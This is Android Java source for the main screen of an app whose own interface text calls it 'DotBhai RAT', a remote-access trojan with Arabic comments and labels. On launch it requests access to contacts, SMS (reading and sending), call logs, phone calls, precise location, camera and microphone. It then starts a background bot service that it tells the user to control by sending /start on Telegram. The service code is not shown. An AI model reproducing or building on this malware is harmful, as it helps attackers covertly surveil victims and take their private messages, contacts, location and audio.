package com.dotbhai.imagesender;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        // 1. بناء الواجهة برمجياً (بدون ملفات xml)
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);

        TextView tv = new TextView(this);
        tv.setText("مرحباً بك في DotBhai RAT\n\n1. اضغط الزر بالأسفل.\n2. اقبل جميع الأذونات.\n3. اذهب لتلجرام وأرسل /start");
        tv.setTextSize(18);
        layout.addView(tv);

        Button btnStart = new Button(this);
        btnStart.setText("تشغيل البوت وإظهار الأزرار");
        layout.addView(btnStart);

        setContentView(layout);

        // 2. طلب الأذونات فوراً عند فتح التطبيق (هذا اللي كان ناقص)
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.CALL_PHONE,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO
            }, 100);
        }

        // 3. تشغيل الخدمة لما يضغط الزر
        btnStart.setOnClickListener(v -> {
            try {
                Intent serviceIntent = new Intent(this, BotCommandService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
                
                Toast.makeText(this, "تم التشغيل! اذهب لتلجرام وأرسل /start", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                Toast.makeText(this, "خطأ: " + e.getMessage(), Toast.LENGTH_LONG).show();
            }
        });
    }
}